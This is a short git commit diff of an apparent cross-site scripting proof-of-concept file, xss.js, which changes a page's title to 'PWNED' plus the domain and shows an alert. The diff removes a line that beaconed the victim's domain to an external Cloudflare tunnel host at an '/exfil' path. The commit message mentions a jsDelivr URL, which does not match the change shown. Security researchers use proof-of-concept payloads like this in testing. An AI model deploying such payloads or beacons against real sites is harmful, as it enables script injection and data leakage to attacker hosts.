9e8d2c6c20b56754d7749d1a75cc1ad8e627cd36
kakarotsec <kakarotsec@users.noreply.github.com>
2026-05-16 00:52:10 +0600

    Use permanent jsDelivr URL

--- xss.js
+++ xss.js
@@ -2,7 +2,6 @@ System.register([], function(exports) {
   return {
     execute: function() {
       document.title = "PWNED-" + document.domain;
-      navigator.sendBeacon("https://null-taxation-statements-silence.trycloudflare.com/exfil?domain=" + document.domain + "&proof=xss_confirmed");
       alert("XSS on " + document.domain);
     }
   };
